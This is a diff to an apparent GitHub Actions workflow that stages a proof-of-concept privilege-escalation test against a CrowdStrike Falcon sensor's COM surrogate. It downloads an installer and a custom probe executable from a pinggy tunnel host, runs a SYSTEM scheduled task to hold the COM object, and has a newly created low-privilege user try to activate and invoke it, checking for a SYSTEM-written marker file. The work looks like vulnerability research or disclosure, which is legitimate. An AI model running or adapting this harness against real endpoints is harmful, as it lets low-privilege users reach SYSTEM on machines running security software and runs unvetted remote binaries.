@@ -13,51 +13,57 @@ jobs:
         run: |
           $ErrorActionPreference='Stop'
           New-Item -ItemType Directory -Force C:\proof | Out-Null
-          Invoke-WebRequest -Headers @{'X-Pinggy-No-Screen'='1'} -Uri 'https://pnaws-2600-1f18-68f7-2200-aca3-5d87-56d3-95f5.run.pinggy-free.link/FalconSensor.exe' -OutFile C:\proof\FalconSensor.exe
-          Invoke-WebRequest -Headers @{'X-Pinggy-No-Screen'='1'} -Uri 'https://pnaws-2600-1f18-68f7-2200-aca3-5d87-56d3-95f5.run.pinggy-free.link/csps4_probe.exe' -OutFile C:\proof\csps4_probe.exe
-          $ih=(Get-FileHash C:\proof\FalconSensor.exe -Algorithm SHA256).Hash.ToLower()
-          $ph=(Get-FileHash C:\proof\csps4_probe.exe -Algorithm SHA256).Hash.ToLower()
-          Write-Host "installer=$ih probe=$ph"
-          if($ih -ne '61737e34ba440128c1deedef8cdf72ee002693db8a25cca922cad58eba28a0b4'){throw 'installer hash mismatch'}
-          if($ph -ne '3c2ba3f64589a2aa7eb11e34c8483ab0cbb70f6503e6844ad4d6fc4480073d95'){throw 'probe hash mismatch'}
-      - name: Install exact sensor
+          $headers=@{'X-Pinggy-No-Screen'='1'}
+          $base='https://pnaws-2600-1f18-68f7-2200-aca3-5d87-56d3-95f5.run.pinggy-free.link'
+          Invoke-WebRequest -Headers $headers -Uri "$base/Sensor.msi" -OutFile C:\proof\Sensor.msi
+          Invoke-WebRequest -Headers $headers -Uri "$base/csps4_automation.exe" -OutFile C:\proof\csps4_automation.exe
+          $ih=(Get-FileHash C:\proof\Sensor.msi -Algorithm SHA256).Hash.ToLower()
+          $ph=(Get-FileHash C:\proof\csps4_automation.exe -Algorithm SHA256).Hash.ToLower()
+          Write-Host "msi=$ih automation=$ph"
+          if($ih -ne '86a92e8e0f0a54372e7a084a1d062a2edbce9a3cf93a97cba8d413a2a3e9e3c8'){throw 'msi hash mismatch'}
+          if($ph -ne '573784b8ead09e58a47d7d70daee04b19008896e29b3687945f7f8ee308c5c89'){throw 'probe hash mismatch'}
+      - name: Install exact MSI
         shell: pwsh
         run: |
           $ErrorActionPreference='Continue'
-          $trigger=New-ScheduledTaskTrigger -Once -At (Get-Date).AddDays(1)
-          $ia=New-ScheduledTaskAction -Execute 'C:\Windows\System32\cmd.exe' -Argument '/d /c C:\proof\FalconSensor.exe /install /quiet /norestart CID=00000000000000000000000000000000-00 ProvWaitTime=1 ^> C:\proof\install.txt 2^>^&1'
-          Register-ScheduledTask -TaskName CsExactInstall -Action $ia -Trigger $trigger -User SYSTEM -RunLevel Highest -Force | Out-Null
-          Start-ScheduledTask CsExactInstall
-          Start-Sleep 90
-          Get-ScheduledTaskInfo CsExactInstall | Format-List
-          Get-Content C:\proof\install.txt -ErrorAction SilentlyContinue
+          $p=Start-Process msiexec.exe -ArgumentList '/i C:\proof\Sensor.msi /qn /norestart /L*v C:\proof\msi.log' -Wait -PassThru
+          Write-Host "msi_exit=$($p.ExitCode)"
+          Start-Sleep 20
           Get-Service | Where-Object {$_.Name -match 'CSFalcon'} | Format-Table -AutoSize
           cmd /c "reg query HKCR\CLSID\{BD07DDB9-1C61-4DCE-9202-A2BA1757CDB2} /s"
           cmd /c "reg query HKCR\AppID /f {BD07DDB9-1C61-4DCE-9202-A2BA1757CDB2} /s"
+          Get-Content C:\proof\msi.log -Tail 80 -ErrorAction SilentlyContinue
           exit 0
-      - name: Access-control proof
+      - name: Access-control and harmless execution proof
         shell: pwsh
         run: |
           $ErrorActionPreference='Continue'
-          $pw='CsPs4-Proof-2026!'
+          $pw='CsPs4p26!'
           net user csps4low $pw /add
           $secure=ConvertTo-SecureString $pw -AsPlainText -Force
           $cred=[pscredential]::new("$env:COMPUTERNAME\csps4low",$secure)
-          # Negative control: low user cannot launch the LocalSystem-only surrogate.
-          $pre=Start-Process C:\proof\csps4_probe.exe -Credential $cred -Wait -PassThru -RedirectStandardOutput C:\proof\low-pre.txt -RedirectStandardError C:\proof\low-pre.err
+          # Negative control: low user cannot activate the LocalSystem-only surrogate.
+          $pre=Start-Process C:\proof\csps4_automation.exe -Credential $cred -Wait -PassThru -RedirectStandardOutput C:\proof\low-pre.txt -RedirectStandardError C:\proof\low-pre.err
           Write-Host "low_pre_exit=$($pre.ExitCode)"; Get-Content C:\proof\low-pre.txt; Get-Content C:\proof\low-pre.err
-          # Positive control: SYSTEM launches and holds the COM object in its surrogate.
+          # SYSTEM launches and holds the exact COM class.
           $trigger=New-ScheduledTaskTrigger -Once -At (Get-Date).AddDays(1)
-          $act=New-ScheduledTaskAction -Execute 'C:\Windows\System32\cmd.exe' -Argument '/d /c C:\proof\csps4_probe.exe hold ^> C:\proof\system-hold.txt 2^>^&1'
+          $act=New-ScheduledTaskAction -Execute 'C:\Windows\System32\cmd.exe' -Argument '/d /c C:\proof\csps4_automation.exe hold ^> C:\proof\system-hold.txt 2^>^&1'
           Register-ScheduledTask -TaskName CsPs4SystemHolder -Action $act -Trigger $trigger -User SYSTEM -RunLevel Highest -Force | Out-Null
           Start-ScheduledTask CsPs4SystemHolder
           Start-Sleep 15
-          Write-Host '--- system holder ---'; Get-Content C:\proof\system-hold.txt
+          Write-Host '--- system holder ---'; Get-Content C:\proof\system-hold.txt -ErrorAction SilentlyContinue
           Write-Host '--- dllhost processes ---'
           Get-CimInstance Win32_Process -Filter "Name='dllhost.exe'" | ForEach-Object { $o=Invoke-CimMethod -InputObject $_ -MethodName GetOwner; [pscustomobject]@{PID=$_.ProcessId;Parent=$_.ParentProcessId;Owner="$($o.Domain)\$($o.User)";Command=$_.CommandLine} } | Format-List
-          # Decisive test: same low user attempts the same CoCreate against running SYSTEM surrogate.
-          $post=Start-Process C:\proof\csps4_probe.exe -Credential $cred -Wait -PassThru -RedirectStandardOutput C:\proof\low-post.txt -RedirectStandardError C:\proof\low-post.err
+          # Decisive AccessPermission test against the already-running SYSTEM surrogate.
+          $post=Start-Process C:\proof\csps4_automation.exe -Credential $cred -Wait -PassThru -RedirectStandardOutput C:\proof\low-post.txt -RedirectStandardError C:\proof\low-post.err
           Write-Host "low_post_exit=$($post.ExitCode)"; Get-Content C:\proof\low-post.txt; Get-Content C:\proof\low-post.err
+          if($post.ExitCode -eq 0){
+            $inv=Start-Process C:\proof\csps4_automation.exe -ArgumentList invoke -Credential $cred -Wait -PassThru -RedirectStandardOutput C:\proof\low-invoke.txt -RedirectStandardError C:\proof\low-invoke.err
+            Write-Host "low_invoke_exit=$($inv.ExitCode)"; Get-Content C:\proof\low-invoke.txt; Get-Content C:\proof\low-invoke.err
+          }
+          Write-Host '--- marker ---'
+          if(Test-Path C:\proof\csps4-system-marker.txt){Get-Content C:\proof\csps4-system-marker.txt;Get-Acl C:\proof\csps4-system-marker.txt|Format-List}else{'MARKER ABSENT'}
+          exit 0
       - name: Upload evidence
         if: always()
         uses: actions/upload-artifact@v4
@@ -69,7 +75,6 @@ jobs:
         if: always()
         shell: pwsh
         run: |
-          Unregister-ScheduledTask CsExactInstall -Confirm:$false -ErrorAction SilentlyContinue
           Unregister-ScheduledTask CsPs4SystemHolder -Confirm:$false -ErrorAction SilentlyContinue
-          Stop-Process -Name csps4_probe -Force -ErrorAction SilentlyContinue
+          Stop-Process -Name csps4_automation -Force -ErrorAction SilentlyContinue
           Remove-LocalUser csps4low -ErrorAction SilentlyContinue
